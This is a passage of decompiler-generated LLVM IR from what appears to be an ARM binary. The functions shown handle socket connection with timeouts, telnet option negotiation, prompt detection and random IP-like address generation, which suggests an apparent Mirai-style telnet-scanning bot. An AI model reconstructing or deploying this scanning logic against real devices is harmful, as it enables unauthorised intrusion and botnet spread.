  %stack_var_-176 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9ddc = load i32, i32* @fp, align 4
  store i32 %v3_9ddc, i32* %stack_var_-16, align 4
  %v13_9ddc = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_9e04 = call i32 @function_10560(i32 %arg1, i32 3)
  %v1_9e14 = or i32 %v2_9e04, 2048
  store i32 %v1_9e14, i32* @r2, align 4
  %v2_9e28 = call i32 @function_10560(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9e44 = urem i32 %arg3, 65536
  %v1_9e4c = call i32 @function_12434(i32 %v3_9e44)
  %v3_9e74 = call i32 @function_9680(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9e7c = icmp eq i32 %v3_9e74, 0
  br i1 %v2_9e7c, label %dec_label_pc_9e90, label %dec_label_pc_9e84

dec_label_pc_9e84:                                ; preds = %dec_label_pc_9dd8
  br label %dec_label_pc_a048

dec_label_pc_9e90:                                ; preds = %dec_label_pc_9dd8
  %v3_9eb8 = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_9eb8 = call i32 @function_124f8(i32 %arg1, %sockaddr* %v3_9eb8, i32 16)
  %v1_9ec8 = icmp slt i32 %v4_9eb8, 0
  br i1 %v1_9ec8, label %dec_label_pc_9ed0, label %dec_label_pc_a00c

dec_label_pc_9ed0:                                ; preds = %dec_label_pc_9e90
  %v0_9ed0 = call i32 @function_10a18()
  %v1_9ed8 = inttoptr i32 %v0_9ed0 to i32*
  %v2_9ed8 = load i32, i32* %v1_9ed8, align 4
  %v7_9edc = icmp eq i32 %v2_9ed8, 115
  br i1 %v7_9edc, label %dec_label_pc_9f08.lr.ph, label %dec_label_pc_a000

dec_label_pc_9f08.lr.ph:                          ; preds = %dec_label_pc_9ed0
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9ef4 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9f08

dec_label_pc_9f08:                                ; preds = %dec_label_pc_9f08.lr.ph, %dec_label_pc_9f08
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9f08.lr.ph ], [ %v1_9f1c, %dec_label_pc_9f08 ]
  %v5_9f14 = mul nuw nsw i32 %storemerge14, 4
  %v6_9f14 = add i32 %v5_9f14, %v2_9ef4
  %v7_9f14 = inttoptr i32 %v6_9f14 to i32*
  store i32 0, i32* %v7_9f14, align 4
  %v1_9f1c = add nuw nsw i32 %storemerge14, 1
  %tmp32 = icmp ult i32 %v1_9f1c, 32
  br i1 %tmp32, label %dec_label_pc_9f08, label %dec_label_pc_9f30

dec_label_pc_9f30:                                ; preds = %dec_label_pc_9f08
  %v3_9f34 = udiv i32 %arg1, 32
  %v3_9f40 = mul nuw nsw i32 %v3_9f34, 4
  %v2_9f48 = add nsw i32 %v3_9f40, -160
  %v2_9f4c = add i32 %v2_9f48, %v13_9ddc
  %v1_9f50 = inttoptr i32 %v2_9f4c to i32*
  %v2_9f50 = load i32, i32* %v1_9f50, align 4
  %v1_9f58 = urem i32 %arg1, 32
  %v6_9f60 = shl i32 1, %v1_9f58
  %v2_9f64 = or i32 %v2_9f50, %v6_9f60
  store i32 %v2_9f64, i32* %v1_9f50, align 4
  %v1_9f84 = add i32 %arg1, 1
  %v2_9f8c = ptrtoint i32* %stack_var_-184 to i32
  %v5_9fa4 = call i32 @function_108bc(i32 %v1_9f84, i32 0, i32 %v2_9ef4, i32 0, i32 %v2_9f8c)
  %tmp33 = icmp slt i32 %v5_9fa4, 1
  br i1 %tmp33, label %dec_label_pc_9ff4, label %dec_label_pc_9fb4

dec_label_pc_9fb4:                                ; preds = %dec_label_pc_9f30
  store i32 4, i32* %stack_var_-188, align 4
  %v2_9fc0 = ptrtoint i32* %stack_var_-188 to i32
  %v6_9fd8 = call i32 @function_12550(i32 %arg1, i32 1, i32 4, i32* nonnull %stack_var_-192, i32 %v2_9fc0)
  %v3_9fdc = load i32, i32* %stack_var_-192, align 4
  %v2_9fe0 = icmp eq i32 %v3_9fdc, 0
  br i1 %v2_9fe0, label %dec_label_pc_a00c, label %dec_label_pc_9fe8

dec_label_pc_9fe8:                                ; preds = %dec_label_pc_9fb4
  br label %dec_label_pc_a048

dec_label_pc_9ff4:                                ; preds = %dec_label_pc_9f30
  br label %dec_label_pc_a048

dec_label_pc_a000:                                ; preds = %dec_label_pc_9ed0
  br label %dec_label_pc_a048

dec_label_pc_a00c:                                ; preds = %dec_label_pc_9e90, %dec_label_pc_9fb4
  store i32 0, i32* @r2, align 4
  %v2_a018 = call i32 @function_10560(i32 %arg1, i32 3)
  %v1_a028 = and i32 %v2_a018, -2049
  store i32 %v1_a028, i32* @r2, align 4
  %v2_a03c = call i32 @function_10560(i32 %arg1, i32 4)
  br label %dec_label_pc_a048

dec_label_pc_a048:                                ; preds = %dec_label_pc_a000, %dec_label_pc_9ff4, %dec_label_pc_9fe8, %dec_label_pc_9e84, %dec_label_pc_a00c
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_9ff4 ], [ 1, %dec_label_pc_a00c ], [ 0, %dec_label_pc_9fe8 ], [ 0, %dec_label_pc_a000 ], [ 0, %dec_label_pc_9e84 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9ef4, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_a048, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a00c, { 1, 0 }
  uselistorder label %dec_label_pc_9f08, { 1, 0 }
}

define i32 @function_a058() local_unnamed_addr {
dec_label_pc_a058:
  %stack_var_0 = alloca i32, align 4
  %v1_a058 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_a058, i32* @ip, align 4
  %v3_a05c = load i32, i32* @r4, align 4
  %v6_a05c = load i32, i32* @r5, align 4
  %v9_a05c = load i32, i32* @r6, align 4
  %v0_a068 = call i32 @function_106d0()
  %v2_a078 = icmp eq i32 %v0_a068, 0
  br i1 %v2_a078, label %dec_label_pc_a1d8, label %dec_label_pc_a08c

dec_label_pc_a08c:                                ; preds = %dec_label_pc_a058
  %v2_a090 = load i32, i32* @global_var_205d8.67, align 4
  %v5_a090 = load i32, i32* @global_var_205dc.68, align 4
  %v2_a09c = add i32 %v2_a090, 1
  %v3_a09c = icmp eq i32 %v2_a09c, 0
  %v4_a0a0 = zext i1 %v3_a09c to i32
  %v5_a0a0 = add i32 %v4_a0a0, %v5_a090
  store i32 %v2_a09c, i32* @global_var_205d8.67, align 4
  store i32 %v5_a0a0, i32* @global_var_205dc.68, align 4
  %v3_a0b4 = udiv i32 %v2_a09c, 1073741824
  %v3_a0b8 = mul i32 %v5_a0a0, 4
  %v2_a0bc = or i32 %v3_a0b8, %v3_a0b4
  store i32 %v2_a0bc, i32* @r4, align 4
  %v3_a0c0 = mul i32 %v2_a09c, 4
  %v1_a0c4 = add i32 %v3_a0c0, 4
  %v1_a0cc = call i32 @function_127d4(i32 %v1_a0c4)
  br label %dec_label_pc_a124

dec_label_pc_a0e4:                                ; preds = %dec_label_pc_a124, %dec_label_pc_a170
  %v3_a0e8 = mul i32 %storemerge2, 4
  %v2_a0f4 = add i32 %v3_a0e8, %v1_a0cc
  %v2_a108 = load i32, i32* @global_var_26654.70, align 4
  %v2_a10c = add i32 %v2_a108, %v3_a0e8
  %v1_a110 = inttoptr i32 %v2_a10c to i32*
  %v2_a110 = load i32, i32* %v1_a110, align 4
  %v2_a114 = inttoptr i32 %v2_a0f4 to i32*
  store i32 %v2_a110, i32* %v2_a114, align 4
  %v1_a11c = add i32 %storemerge2, 1
  br label %dec_label_pc_a124

dec_label_pc_a124:                                ; preds = %dec_label_pc_a08c, %dec_label_pc_a0e4
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a08c ], [ %v1_a11c, %dec_label_pc_a0e4 ]
  %v2_a13c = load i32, i32* @global_var_205d8.67, align 4
  %v5_a13c = load i32, i32* @global_var_205dc.68, align 4
  %v2_a150 = add i32 %v2_a13c, -1
  %v3_a150 = icmp ne i32 %v2_a13c, 0
  %v3_a154 = add i32 %v5_a13c, -1
  %v5_a154 = sext i1 %v3_a150 to i32
  %v9_a168 = icmp eq i32 %v3_a154, %v5_a154
  br i1 %v9_a168, label %dec_label_pc_a170, label %dec_label_pc_a0e4

dec_label_pc_a170:                                ; preds = %dec_label_pc_a124
  store i32 %v2_a150, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a150, %storemerge2
  br i1 %tmp, label %dec_label_pc_a0e4, label %dec_label_pc_a190

dec_label_pc_a190:                                ; preds = %dec_label_pc_a170
  store i32 %v5_a13c, i32* @r4, align 4
  %v3_a198 = mul i32 %v2_a13c, 4
  %v2_a1a4 = add i32 %v1_a0cc, -4
  %v1_a1a8 = add i32 %v2_a1a4, %v3_a198
  %v2_a1b0 = inttoptr i32 %v1_a1a8 to i32*
  store i32 %v0_a068, i32* %v2_a1b0, align 4
  %v2_a1b8 = load i32, i32* @global_var_26654.70, align 4
  %v1_a1c0 = call i32 @function_12928(i32 %v2_a1b8)
  store i32 %v1_a0cc, i32* @global_var_26654.70, align 4
  br label %dec_label_pc_a1d8

dec_label_pc_a1d8:                                ; preds = %dec_label_pc_a058, %dec_label_pc_a190
  store i32 %v3_a05c, i32* @r4, align 4
  store i32 %v6_a05c, i32* @r5, align 4
  store i32 %v9_a05c, i32* @r6, align 4
  ret i32 %v0_a068

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a0e8, { 1, 0 }
  uselistorder i32 %v1_a0cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a1d8, { 1, 0 }
  uselistorder label %dec_label_pc_a124, { 1, 0 }
  uselistorder label %dec_label_pc_a0e4, { 1, 0 }
}

define i32 @function_a1f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_a1f0:
  %stack_var_-17 = alloca i8, align 1
  %v1_a210 = add i32 %arg2, 1
  %v1_a214 = inttoptr i32 %v1_a210 to i8*
  %v2_a214 = load i8, i8* %v1_a214, align 1
  %v7_a220 = icmp ult i8 %v2_a214, -5
  br i1 %v7_a220, label %dec_label_pc_a36c, label %dec_label_pc_a228

dec_label_pc_a228:                                ; preds = %dec_label_pc_a1f0
  %v7_a230 = icmp eq i8 %v2_a214, -1
  br i1 %v7_a230, label %dec_label_pc_a234, label %dec_label_pc_a250

dec_label_pc_a234:                                ; preds = %dec_label_pc_a228
  br label %dec_label_pc_a36c

dec_label_pc_a250:                                ; preds = %dec_label_pc_a228
  store i8 -1, i8* %stack_var_-17, align 1
  %v5_a26c = bitcast i8* %stack_var_-17 to i32*
  %v6_a26c = call i32 @function_125ac(i32 %arg1, i32* %v5_a26c, i32 1, i32 16384)
  %v2_a278 = load i8, i8* %v1_a214, align 1
  %v7_a27c = icmp eq i8 %v2_a278, -4
  br i1 %v7_a27c, label %dec_label_pc_a284, label %dec_label_pc_a290

dec_label_pc_a284:                                ; preds = %dec_label_pc_a250
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a330

dec_label_pc_a290:                                ; preds = %dec_label_pc_a250
  %v2_a298 = load i8, i8* %v1_a214, align 1
  %v7_a29c = icmp eq i8 %v2_a298, -2
  br i1 %v7_a29c, label %dec_label_pc_a2a4, label %dec_label_pc_a2b0

dec_label_pc_a2a4:                                ; preds = %dec_label_pc_a290
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a330

dec_label_pc_a2b0:                                ; preds = %dec_label_pc_a290
  %v2_a2b8 = load i8, i8* %v1_a214, align 1
  %v7_a2bc = icmp eq i8 %v2_a2b8, 3
  %v7_a2d0 = icmp eq i8 %v2_a2b8, -3
  br i1 %v7_a2bc, label %dec_label_pc_a2c4, label %dec_label_pc_a2fc

dec_label_pc_a2c4:                                ; preds = %dec_label_pc_a2b0
  br i1 %v7_a2d0, label %dec_label_pc_a2d8, label %dec_label_pc_a2e4

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a2c4
  br label %dec_label_pc_a2ec

dec_label_pc_a2e4:                                ; preds = %dec_label_pc_a2c4
  br label %dec_label_pc_a2ec

dec_label_pc_a2ec:                                ; preds = %dec_label_pc_a2d8, %dec_label_pc_a2e4
  %storemerge = phi i8 [ -3, %dec_label_pc_a2e4 ], [ -5, %dec_label_pc_a2d8 ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a330

dec_label_pc_a2fc:                                ; preds = %dec_label_pc_a2b0
  br i1 %v7_a2d0, label %dec_label_pc_a310, label %dec_label_pc_a31c

dec_label_pc_a310:                                ; preds = %dec_label_pc_a2fc
  br label %dec_label_pc_a324

dec_label_pc_a31c:                                ; preds = %dec_label_pc_a2fc
  br label %dec_label_pc_a324

dec_label_pc_a324:                                ; preds = %dec_label_pc_a310, %dec_label_pc_a31c
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a31c ], [ -4, %dec_label_pc_a310 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a330

dec_label_pc_a330:                                ; preds = %dec_label_pc_a2ec, %dec_label_pc_a2a4, %dec_label_pc_a284, %dec_label_pc_a324
  %v5_a344 = call i32 @function_125ac(i32 %arg1, i32* nonnull %v5_a26c, i32 1, i32 16384)
  %v1_a34c = add i32 %arg2, 2
  %v4_a360 = inttoptr i32 %v1_a34c to i32*
  %v5_a360 = call i32 @function_125ac(i32 %arg1, i32* %v4_a360, i32 1, i32 16384)
  br label %dec_label_pc_a36c

dec_label_pc_a36c:                                ; preds = %dec_label_pc_a234, %dec_label_pc_a330, %dec_label_pc_a1f0
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a36c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a330, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a324, { 1, 0 }
  uselistorder label %dec_label_pc_a2ec, { 1, 0 }
}

define i32 @function_a37c(i32 %arg1) local_unnamed_addr {
dec_label_pc_a37c:
  store i32 %arg1, i32* @r0, align 4
  %v0_a39c = call i32 @function_11e30()
  %v2_a3e4 = add i32 %v0_a39c, %arg1
  br label %dec_label_pc_a4b8

dec_label_pc_a3bc:                                ; preds = %dec_label_pc_a444, %dec_label_pc_a420, %dec_label_pc_a3fc, %dec_label_pc_a3d8
  %v1_a3c0 = add nsw i32 %stack_var_-24.014, 1
  %v7_a3d4 = icmp sgt i32 %v0_a39c, %v1_a3c0
  br i1 %v7_a3d4, label %dec_label_pc_a3d8, label %dec_label_pc_a468

dec_label_pc_a3d8:                                ; preds = %dec_label_pc_a3c8.preheader, %dec_label_pc_a3bc
  %stack_var_-24.014 = phi i32 [ %v1_a3c0, %dec_label_pc_a3bc ], [ %stack_var_-24.1, %dec_label_pc_a3c8.preheader ]
  %v2_a3ec = sub i32 %v2_a3e4, %stack_var_-24.014
  %v1_a3f0 = inttoptr i32 %v2_a3ec to i8*
  %v2_a3f0 = load i8, i8* %v1_a3f0, align 1
  %v2_a3f4 = icmp eq i8 %v2_a3f0, 0
  br i1 %v2_a3f4, label %dec_label_pc_a3bc, label %dec_label_pc_a3fc

dec_label_pc_a3fc:                                ; preds = %dec_label_pc_a3d8
  %v2_a414 = load i8, i8* %v1_a3f0, align 1
  %v7_a418 = icmp eq i8 %v2_a414, 32
  br i1 %v7_a418, label %dec_label_pc_a3bc, label %dec_label_pc_a420

dec_label_pc_a420:                                ; preds = %dec_label_pc_a3fc
  %v2_a438 = load i8, i8* %v1_a3f0, align 1
  %v7_a43c = icmp eq i8 %v2_a438, 13
  br i1 %v7_a43c, label %dec_label_pc_a3bc, label %dec_label_pc_a444

dec_label_pc_a444:                                ; preds = %dec_label_pc_a420
  %v2_a45c = load i8, i8* %v1_a3f0, align 1
  %v7_a460 = icmp eq i8 %v2_a45c, 10
  br i1 %v7_a460, label %dec_label_pc_a3bc, label %dec_label_pc_a468

dec_label_pc_a468:                                ; preds = %dec_label_pc_a444, %dec_label_pc_a3bc, %dec_label_pc_a3c8.preheader
  %stack_var_-24.0.lcssa = phi i32 [ %stack_var_-24.1, %dec_label_pc_a3c8.preheader ], [ %stack_var_-24.014, %dec_label_pc_a444 ], [ %v1_a3c0, %dec_label_pc_a3bc ]
  %v2_a47c = sub i32 %v2_a3e4, %stack_var_-24.0.lcssa
  %v1_a480 = inttoptr i32 %v2_a47c to i8*
  %v2_a480 = load i8, i8* %v1_a480, align 1
  %v2_a490 = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_16d48.72 to i32)
  %v1_a494 = inttoptr i32 %v2_a490 to i8*
  %v2_a494 = load i8, i8* %v1_a494, align 1
  %v9_a498 = icmp eq i8 %v2_a480, %v2_a494
  %v1_a4b0 = add i32 %storemerge3, 1
  br i1 %v9_a498, label %dec_label_pc_a4d8, label %dec_label_pc_a4b8

dec_label_pc_a4b8:                                ; preds = %dec_label_pc_a468, %dec_label_pc_a37c
  %stack_var_-24.1 = phi i32 [ 0, %dec_label_pc_a37c ], [ %stack_var_-24.0.lcssa, %dec_label_pc_a468 ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_a37c ], [ %v1_a4b0, %dec_label_pc_a468 ]
  store i32 ptrtoint ([6 x i8]* @global_var_16d48.72 to i32), i32* @r0, align 4
  %v0_a4c0 = call i32 @function_11e30()
  %v3_a4c8 = icmp ult i32 %storemerge3, %v0_a4c0
  br i1 %v3_a4c8, label %dec_label_pc_a3c8.preheader, label %dec_label_pc_a4d8

dec_label_pc_a3c8.preheader:                      ; preds = %dec_label_pc_a4b8
  %v7_a3d413 = icmp sgt i32 %v0_a39c, %stack_var_-24.1
  br i1 %v7_a3d413, label %dec_label_pc_a3d8, label %dec_label_pc_a468

dec_label_pc_a4d8:                                ; preds = %dec_label_pc_a4b8, %dec_label_pc_a468
  %storemerge4 = phi i32 [ 1, %dec_label_pc_a468 ], [ 0, %dec_label_pc_a4b8 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v0_a39c, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_16d48.72 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_a468, { 2, 0, 1 }
}

define i32 @function_a4ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a4ec:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %v3_a4f0 = load i32, i32* @fp, align 4
  store i32 %v3_a4f0, i32* %stack_var_-16, align 4
  %v13_a4f0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a540 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a580 = udiv i32 %arg1, 32
  %v3_a58c = mul nuw nsw i32 %v3_a580, 4
  %v1_a5a4 = urem i32 %arg1, 32
  %v6_a5ac = shl i32 1, %v1_a5a4
  %v1_a5d0 = add i32 %arg1, 1
  %v2_a5d8 = ptrtoint i32* %stack_var_-176 to i32
  %v2_a6f8 = inttoptr i32 %arg2 to i8*
  %v2_a70c = icmp eq i32 %arg3, 0
  %v5_a75c = icmp sgt i32 %tmp29, 0
  %v2_a594 = add nsw i32 %v3_a58c, -152
  %v2_a598 = add i32 %v2_a594, %v13_a4f0
  %v1_a59c = inttoptr i32 %v2_a598 to i32*
  br label %dec_label_pc_a734

dec_label_pc_a554.lr.ph:                          ; preds = %dec_label_pc_a748, %dec_label_pc_a754
  br label %dec_label_pc_a554

dec_label_pc_a554:                                ; preds = %dec_label_pc_a554.lr.ph, %dec_label_pc_a554
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a554.lr.ph ], [ %v1_a568, %dec_label_pc_a554 ]
  %v5_a560 = mul nuw nsw i32 %storemerge27, 4
  %v6_a560 = add i32 %v5_a560, %v2_a540
  %v7_a560 = inttoptr i32 %v6_a560 to i32*
  store i32 0, i32* %v7_a560, align 4
  %v1_a568 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a568, 32
  br i1 %tmp30, label %dec_label_pc_a554, label %dec_label_pc_a57c

dec_label_pc_a57c:                                ; preds = %dec_label_pc_a554
  %v2_a59c = load i32, i32* %v1_a59c, align 4
  %v2_a5b0 = or i32 %v2_a59c, %v6_a5ac
  store i32 %v2_a5b0, i32* %v1_a59c, align 4
  %v5_a5ec = call i32 @function_108bc(i32 %v1_a5d0, i32 %v2_a540, i32 0, i32 0, i32 %v2_a5d8)
  %tmp31 = icmp slt i32 %v5_a5ec, 1
  br i1 %tmp31, label %dec_label_pc_a778, label %dec_label_pc_a5fc

dec_label_pc_a5fc:                                ; preds = %dec_label_pc_a57c
  %v2_a608 = add i32 %stack_var_-40.0, %tmp9
  %v5_a60c = inttoptr i32 %v2_a608 to i8*
  %v6_a620 = inttoptr i32 %v2_a608 to i32*
  %v7_a620 = call i32 @function_12580(i32 %arg1, i32* %v6_a620, i32 1, i32 0, i32 %v2_a608)
  %v7_a630 = icmp eq i32 %v7_a620, -1
  br i1 %v7_a630, label %dec_label_pc_a644, label %dec_label_pc_a638

dec_label_pc_a638:                                ; preds = %dec_label_pc_a5fc
  %v2_a63c = icmp eq i32 %v7_a620, 0
  br i1 %v2_a63c, label %dec_label_pc_a644, label %dec_label_pc_a650

dec_label_pc_a644:                                ; preds = %dec_label_pc_a638, %dec_label_pc_a5fc
  br label %dec_label_pc_a780

dec_label_pc_a650:                                ; preds = %dec_label_pc_a638
  %v2_a658 = add i32 %v7_a620, %stack_var_-40.0
  %v2_a664 = load i8, i8* %v5_a60c, align 1
  %v2_a668 = icmp eq i8 %v2_a664, -1
  br i1 %v2_a668, label %dec_label_pc_a670, label %dec_label_pc_a6f0

dec_label_pc_a670:                                ; preds = %dec_label_pc_a650
  %v1_a674 = add i32 %v2_a608, 1
  %v5_a688 = inttoptr i32 %v1_a674 to i32*
  %v6_a688 = call i32 @function_12580(i32 %arg1, i32* %v5_a688, i32 2, i32 0, i32 %v2_a658)
  %v7_a698 = icmp eq i32 %v6_a688, -1
  br i1 %v7_a698, label %dec_label_pc_a6ac, label %dec_label_pc_a6a0

dec_label_pc_a6a0:                                ; preds = %dec_label_pc_a670
  %v2_a6a4 = icmp eq i32 %v6_a688, 0
  br i1 %v2_a6a4, label %dec_label_pc_a6ac, label %dec_label_pc_a6b8

dec_label_pc_a6ac:                                ; preds = %dec_label_pc_a6a0, %dec_label_pc_a670
  br label %dec_label_pc_a780

dec_label_pc_a6b8:                                ; preds = %dec_label_pc_a6a0
  %v2_a6c0 = add i32 %v6_a688, %v2_a658
  %v6_a6d4 = call i32 @function_a1f0(i32 %arg1, i32 %v2_a608, i32 3, i32 %v2_a6c0, i32 %v2_a6c0, i32 %v6_a688)
  %v2_a6dc = icmp eq i32 %v6_a6d4, 0
  br i1 %v2_a6dc, label %dec_label_pc_a6e4, label %dec_label_pc_a734

dec_label_pc_a6e4:                                ; preds = %dec_label_pc_a6b8
  br label %dec_label_pc_a780

dec_label_pc_a6f0:                                ; preds = %dec_label_pc_a650
  %v3_a6f8 = call i32 @function_1214c(i32 %tmp9, i8* %v2_a6f8)
  %v2_a700 = icmp eq i32 %v3_a6f8, 0
  br i1 %v2_a700, label %dec_label_pc_a708, label %dec_label_pc_a76c

dec_label_pc_a708:                                ; preds = %dec_label_pc_a6f0
  br i1 %v2_a70c, label %dec_label_pc_a734, label %dec_label_pc_a714

dec_label_pc_a714:                                ; preds = %dec_label_pc_a708
  %v1_a718 = call i32 @function_a37c(i32 %tmp9)
  %v2_a720 = icmp eq i32 %v1_a718, 0
  br i1 %v2_a720, label %dec_label_pc_a734, label %dec_label_pc_a76c

dec_label_pc_a734:                                ; preds = %dec_label_pc_a6b8, %dec_label_pc_a714, %dec_label_pc_a708, %dec_label_pc_a4ec
  %stack_var_-40.0 = phi i32 [ %tmp17, %dec_label_pc_a4ec ], [ %v2_a6c0, %dec_label_pc_a6b8 ], [ %v2_a658, %dec_label_pc_a708 ], [ %v2_a658, %dec_label_pc_a714 ]
  %v1_a738 = add i32 %stack_var_-40.0, 2
  %v6_a744 = icmp slt i32 %v1_a738, %tmp
  br i1 %v6_a744, label %dec_label_pc_a748, label %dec_label_pc_a778

dec_label_pc_a748:                                ; preds = %dec_label_pc_a734
  %v3_a748 = load i32, i32* %stack_var_-176, align 4
  %v5_a750 = icmp sgt i32 %v3_a748, 0
  br i1 %v5_a750, label %dec_label_pc_a554.lr.ph, label %dec_label_pc_a754

dec_label_pc_a754:                                ; preds = %dec_label_pc_a748
  br i1 %v5_a75c, label %dec_label_pc_a554.lr.ph, label %dec_label_pc_a778

dec_label_pc_a76c:                                ; preds = %dec_label_pc_a6f0, %dec_label_pc_a714
  br label %dec_label_pc_a780

dec_label_pc_a778:                                ; preds = %dec_label_pc_a57c, %dec_label_pc_a754, %dec_label_pc_a734
  br label %dec_label_pc_a780

dec_label_pc_a780:                                ; preds = %dec_label_pc_a76c, %dec_label_pc_a6e4, %dec_label_pc_a6ac, %dec_label_pc_a644, %dec_label_pc_a778
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a778 ], [ 1, %dec_label_pc_a76c ], [ 0, %dec_label_pc_a644 ], [ 0, %dec_label_pc_a6ac ], [ 0, %dec_label_pc_a6e4 ]
  %v2_a78c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_a78c, i32* @fp, align 4
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v6_a688, { 2, 1, 3, 0 }
  uselistorder i32 %v7_a620, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a540, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 %tmp9, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a780, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a778, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a76c, { 1, 0 }
  uselistorder label %dec_label_pc_a734, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a554, { 1, 0 }
  uselistorder label %dec_label_pc_a554.lr.ph, { 1, 0 }
}

define i32 @function_a790(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_a790:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a794 = load i32, i32* @fp, align 4
  store i32 42908, i32* %stack_var_-4, align 4
  %v2_a798 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a798, i32* @fp, align 4
  %v0_a7a8 = call i32 @function_12d1c()
  %v2_a7b8 = call i32 @function_103f4(i32 %v0_a7a8, i32 253)
  %v6_a7c4 = trunc i32 %v2_a7b8 to i8
  %v0_a7c8 = call i32 @function_12d1c()
  %v2_a7d8 = call i32 @function_103f4(i32 %v0_a7c8, i32 255)
  %v1_a7e4 = trunc i32 %v2_a7d8 to i8
  %v0_a7e8 = call i32 @function_12d1c()
  %v2_a7f8 = call i32 @function_103f4(i32 %v0_a7e8, i32 255)
  %v1_a804 = trunc i32 %v2_a7f8 to i8
  %v0_a808 = call i32 @function_12d1c()
  %v2_a818 = call i32 @function_103f4(i32 %v0_a808, i32 255)
  br label %dec_label_pc_a8ac

dec_label_pc_a82c:                                ; preds = %dec_label_pc_a8dc, %dec_label_pc_a8fc, %dec_label_pc_a8f0, %dec_label_pc_a8b8, %dec_label_pc_a8ac
  %v0_a82c = call i32 @function_12d1c()
  %v2_a83c = call i32 @function_103f4(i32 %v0_a82c, i32 253)
  %v6_a848 = trunc i32 %v2_a83c to i8
  %v0_a84c = call i32 @function_12d1c()
  %v2_a85c = call i32 @function_103f4(i32 %v0_a84c, i32 255)
  %v1_a868 = trunc i32 %v2_a85c to i8
  %v0_a86c = call i32 @function_12d1c()
  %v2_a87c = call i32 @function_103f4(i32 %v0_a86c, i32 255)
  %v1_a888 = trunc i32 %v2_a87c to i8
  %v0_a88c = call i32 @function_12d1c()
  %v2_a89c = call i32 @function_103f4(i32 %v0_a88c, i32 255)
  br label %dec_label_pc_a8ac

dec_label_pc_a8ac:                                ; preds = %dec_label_pc_a790, %dec_label_pc_a82c
  %storemerge = phi i32 [ %v2_a818, %dec_label_pc_a790 ], [ %v2_a89c, %dec_label_pc_a82c ]
  %stack_var_-18.0 = phi i8 [ %v1_a804, %dec_label_pc_a790 ], [ %v1_a888, %dec_label_pc_a82c ]
